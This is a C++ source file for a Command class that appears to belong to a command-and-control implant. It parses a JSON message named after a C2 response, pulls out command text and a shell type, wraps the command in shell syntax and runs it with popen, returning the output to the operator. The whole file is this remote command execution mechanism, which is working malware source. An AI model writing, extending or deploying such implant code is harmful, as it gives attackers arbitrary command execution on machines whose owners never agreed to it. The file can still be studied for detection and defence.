#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"

#include <string>

#include "constants.hh"
#include "system.hh"

class Command {
   public:
    Command(std::string& c2Response);
    std::string execute();

    std::string commandText;
    std::string shell;
};

/* Define Command member functions */
Command::Command(std::string& c2Response) {
    // Parse into something resembling a nested unordered map
    rapidjson::Document json;
    json.Parse(c2Response.c_str());

    if (json.IsObject()) {
        commandText = json["command_text"].IsString()
                          ? json["command_text"].GetString()
                          : "";
        shell =
            json["shell"].IsString() ? json["shell"].GetString() : "default";
    } else {
        shell = "default";
    }
}

std::string Command::execute() {
    /* Add necessary syntax before and after command
     * depending on shell choice */
    std::string stringToExecute;

    if (shell == "default") {
        stringToExecute = commandText;
    } else {
        std::string preText, postText;
        std::tie(preText, postText) = SHELL_SYNTAX_LIST.at(shell.c_str());
        stringToExecute = preText + commandText + postText;
    }

    return util::popenSubprocess(stringToExecute.c_str());
}